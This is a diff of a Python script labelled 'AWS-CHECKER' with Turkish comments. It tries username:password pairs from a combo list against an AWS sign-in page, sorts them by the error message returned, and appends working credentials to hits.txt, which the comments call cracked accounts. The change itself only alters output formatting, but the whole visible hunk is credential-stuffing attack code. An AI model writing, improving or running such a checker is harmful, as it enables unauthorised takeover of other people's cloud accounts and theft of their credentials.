@@ -48,18 +48,18 @@ def aws(): ## Fonksiyonumuz
             ## Kontrol mekanizması olduğu kısım "şifre yanlış"  gibi durumları yapacağı kısım
             if "Your login attempt has failed. Make sure the username and password are correct." in giris_yap.text:
                 sayac = sayac+1
-                print(str(sayac)+ " Calismayan hesap - ",combo[0],combo[1]+"  ####### MADE IN AFLEXTR(AWS-CHECKER)")
+                print(str(sayac)+ " Calismayan hesap - ",combo[0]+":"+combo[1]+"  ####### MADE IN AFLEXTR(AWS-CHECKER)")
             elif "Enter a value in the Password field." in giris_yap.text:        
                 sayac = sayac+1
-                print(str(sayac)+ " Calismayan hesap - ",combo[0],combo[1]+"  ####### MADE IN AFLEXTR(AWS-CHECKER)")
+                print(str(sayac)+ " Calismayan hesap - ",combo[0]+":"+combo[1]+"  ####### MADE IN AFLEXTR(AWS-CHECKER)")
             elif "User is not active. If password has not been set, click Forgot password link below to set." in giris_yap.text:        
                 sayac = sayac+1
-                print(str(sayac)+ " Calismayan hesap - ",combo[0],combo[1]+"  ####### MADE IN AFLEXTR(AWS-CHECKER)")
+                print(str(sayac)+ " Calismayan hesap - ",combo[0]+":"+combo[1]+"  ####### MADE IN AFLEXTR(AWS-CHECKER)")
             else:
                 sayac = sayac+1
                 ## Kırdığımız hesabı dosyaya kaydediyoruz
                 hit = open("hits.txt","a")
-                print(str(sayac)+ " Calisan hesap + ",combo[0],combo[1])
+                print(str(sayac)+ " Calisan hesap + ",combo[0]+":"+combo[1])
                 hit.write(combo[0])
                 hit.write(":")
                 hit.write(combo[1])
